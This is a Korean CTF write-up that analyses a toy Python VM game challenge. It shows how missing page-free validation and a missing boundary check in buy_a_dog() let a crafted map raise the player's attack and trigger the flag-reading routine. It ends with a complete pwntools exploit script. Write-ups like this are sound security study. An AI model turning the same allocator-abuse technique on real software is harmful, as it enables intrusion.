 288 :  inc r6				# r6++
 28a :  mov3 [r5], r6		# *(0x1000)++
 28c :  mul r6, #0x3		
 291 :  add r6, r10			# r6 = 0x1000 + r6*0x3	
 293 :  mov3 r5, r11
 295 :  sub r5, #0x3
 29a :  mov3 r5, [r5]		# r5 = *(bp-0x3)
 29c :  mov3 [r6], r5		# *(r6) = r5			<======= vulner!!
```



근데 사실 페이지의 개수가 정해져 있어서 무작정 `buy_a_dog()`를 실행시킬 수는 없습니다. 아래와 같이 0x100 개의 페이지 개수를 사용하는 것을 알 수 있습니다.

```python
class Memory:
    def __init__(self, size): # 2**20
        self.memory = [0 for i in range(size)]
        self.pages = {}
        for page in range(0, size, 0x1000): # page 0x100
            self.pages[page] = 0
```



근데, 처음 `load_firm()`함수에서 4번의 `allocation`을 하고, `load_stage()`를 통해 또 한 번의 `allocation`을 진행하므로 `buy_a_dog()`는 0xfb번 실행시킬 수 있는 거십니다..





## sell_a_dog()

```c
void sell_a_dog(){
    if(sell_num == 0){
    	print_content(0xc2c);	//"you can't sell...."
    	return;
    }
    sell_num--;
    
    print_content(0xbac);	//"which dog...sell?"
    read(0, bp-0x6, 0x4);
    
    if( *(bp-0x6) < 0x100000){
        print_content(0xc2c);	//"you can't sell...."
    	return;
    }
    
    page_free(*(bp-0x6));
    print_content(0xbcd);	//"goodbye my dog..."
}
```

본 함수는 할당한 메모리를 반환시키는 작업을 수행합니다. 주소를 입력한 뒤(7bit로), 해당 주소에 해당하는 메모리 공간을 `deallocation` 해줍니다. 입력받는 주소가 0x100000 이상이어야 `page_free()`를 해주는데, 사실상 사용하는 메모리 공간이 `0 ~ (2**20-1)` 이기 때문에  사용하지도 않는 공간을 `deallocation`할 수 밖에 없습니다. 최대 6번 사용 가능합니다.



`deallocation` 작업은 다음과 같은 코드로 실행됩니다.

```python
def sys_s6(self): # page free
    addr = self.register.get_register('r1') & 0b111111111000000000000
    self.memory.set_perm(addr, 0b0000)
```

입력받은 주소의 페이지 시작 주소를 구한 뒤 `set_perm()`를 통해, 해당 메모리 공간의 권한들을 제거해줍니다. 이 권한 중에는 **PERM_MAPPED** 역시 포함되어 있어, 해당 메모리 공간은 사용되지 않는 공간으로 저장됩니다. 본 작업에 있어, 해당 공간이 **실제 사용되었던 공간인지에 관련된 보안체크**가 없기 때문에, **취약**하다고 볼 수 있습니다.



`set_perm()`은 다음과 같이 구성되어있는데, 해당 메모리 공간에 권한을 설정해줍니다. 여기서 눈여겨 볼 점은, **딕셔너리 형식으로 되어있기 때문에**, 정상적으로 범위 내의 메모리 공간의 경우 기존 리스트에서 찾아쓰지만, **범위 밖의 메모리 주소**일 경우 **pages**에 등록되어있지 않아, **새로 추가가 된다**는 점입니다.

```python
def set_perm(self, addr, perm):
    self.pages[addr & 0b111111111000000000000] = perm & 0b1111
```



이 시점에서 아까 봤던 `buy_a_dog()`의 `sys_allocation`을 다시 살펴봅시당. 

```python
def sys_s4(self): # allocate()
    res_ptr = self.register.get_register('r1')
    perm = self.register.get_register('r2')

    addr = self.memory.allocate(perm)
    if addr != -1:
        self.write_memory_tri(res_ptr, [addr], 1)
        self.register.set_register('r0', 1)
    else:
        self.register.set_register('r0', 0)
        
def allocate(self, new_perm, addr=None):
    if addr:
        if not (self.get_perm(addr) & PERM_MAPPED): # identify mapped
            self.set_perm(addr, (PERM_MAPPED | new_perm) & 0b1111)
            return addr
        else:
            return -1

    for page, perm in self.pages.items():
        if not (self.get_perm(page) & PERM_MAPPED):
            self.set_perm(page, (PERM_MAPPED | new_perm) & 0b1111)
            return page
    return -1
```

`allocate()`를 자세히 보면 메모리 페이지를 할당하는 부분은 단순히 **pages**에서 **PERM_MAPPED**가 0으로 세팅된 페이지에 권한만 바꿔주어 할당시킨다는 것을 알 수 있습니다. 이는 단순히 **pages** 딕셔너리 안에 존재하기만 하면 해당 주소를 할당받을 수 있다는 것을 의미합니다. 

> **pages** 딕셔너리는 다음과 같이 생겼습니다.
>
> ```python
> {0: 13, 4096: 14, 364544: 14, 802816: 14, 114688: 14, 237568: 14, 905216: 14, 634880: 14, 765952: 14, 782336: 14, 987136: 14, 507904: 14, 831488: 14, 380928: 14, 675840: 14, 253952: 0, 1032192: 0, 126976: 0, 1011712: 0, 860160: 0, 524288: 0, 704512: 0, 397312: 0, 548864: 0, 270336: 0, 143360: 0, 733184: 0, 16384: 0, 913408: 0, 577536: 0, 413696: 0, 286720: 0, 917504: 0, 159744: 0, 606208: 0, 32768: 0, 430080: 0, 757760: 0, 303104: 0, .....
> ```

따라서, `sell_a_dog()`로 0x100000 이상의 주소 값을 가진 메모리를 해제시키면 **pages** 딕셔너리에 추가가되어 할당받을 수 있는 페이지 수가 늘어납니다. 추가적으로 `buy_a_dog()`를 실행시킬 수 있게 됩니다.



> 0x100000 이상의 주소 값을 가진 메모리를 할당받는 것이 가능하여 `buy_a_dog()`의 **[0x1000]**은 증가시킬 수 있으나, `read()` 시 쓸 수 없는 주소에 쓰기를 시도하여 에러가 발생하므로, 'y' 를 선택하지 않도록 합니다.



## Vulnerability

이제 공격방법을 생각해봅시당

어셈 코드를 잘 살펴보면 `_sub_5bf()`가 **flag** 파일을 `open -> read -> write` 해주는 것을 확인할 수 있습니다. 해당 함수는, 위의 **C 코드**에서 **boss 몬스터**를 만났을 때, **[0x130c]**가 **0x2bc **보다 클 경우 실행됩니다. [**0x130c]**는 사용자의 **공격력**으로 사용되며, **0x2bc**는 보스 몹의 **체력**을 나타내는 것 같습니다.

따로 `eip`를 변조시킬 구녕은 안보이니, 얌전히 **[0x130c]**에 해당하는 값을 **0x2bc**보다 크게 만들 방법을 찾는게 좋을 것 같습니당



제가 찾아낸 **[0x130c]**에 접근할 수 있을 것 같은 방법은 총 두 가지였습니다.

> 1. 첫 번째로는 본 문제의 취약점인 **no boundary check**를 사용한 접근 방법
> 2. 두 번쨰로는 *** item**을 이용한 **power up**

사실 여기서 1번 방법으로는 아쉽게도 **[0x130c]**까지는 접근할 수가 없어 폐기처리 했지만,  2번 방법으로 **공격력을 높여서** 플래그를 얻을 수 있습니다.



앞서 언급했었던,  `buy_a_dog()`와 `sell_a_dog()`를 이용하여 메모리에 값을 덮어씌울 수 있는 방법은 최대 **map_address**를 나타내는**[0x1303]**까지만 새로 할당받은 메모리 주소로 덮을 수 있습니다.



제공된 **stage.map** 환경에서는 **공격력**을 **0x2bc**보다 높일 수 있는 방법이 존재하지 않지만, `buy_a_dog()`를 실행하면서 할당받는 메모리 공간을 새로운 **map** 공간으로 활용할 수 있기 때문에, 새로운 **map**을 생성해주는 것이 가능합니다. **power up item *** 가 가득찬 **map** 을 생성해주면 됩니당 



# Exploit

```python
#!/usr/bin/python
from pwn import *

def buy_a_dog(data, answer = 'y'):
	r.sendlineafter('>', '2')
	r.sendlineafter('>', answer)
	r.sendline(data)

def sell_a_dog(data):
	r.sendlineafter('>', '3')
	r.sendlineafter('>', data)

def moving(direction):
	r.sendlineafter('>', direction)

r = process('./vm_tiny.py')
#context.log_level = 'debug'

payload = 'AAAA' 

for i in range(0, 0xfa):			# page max: 0x100 = 4(load_firm) + 1(load_map) + 0xfb
	buy_a_dog(payload)

for i in range(0, 6):
	sell_a_dog('aaa')
	buy_a_dog(payload, 'n')

new_map = '@'
new_map += '*'*(0x3c*3-1)
new_map += 'z'
new_map += ' '*(0x3c*(0x3c-3)-1)
buy_a_dog(new_map)

for i in range(0, 0x3):		
	for j in range(0, 0x3c): 		# return first location
		moving('d')
	moving('s')

r.sendlineafter('>', 'a')

r.interactive()
```



# Comment

- 0x100000 이상의 주소를 `deallocation` 할 경우, 해당 주소 이 후의 **pages**가 사라지는 것처럼 보이는 것은 그냥 딕셔너리 배열이 이상해서, 중간에 해당 주소의 페이지를 만난 뒤 작업이 끝나서 그럼
- 이제 슬슬 어셈이 눈에 들어오는 것 같다
- 할많하않...
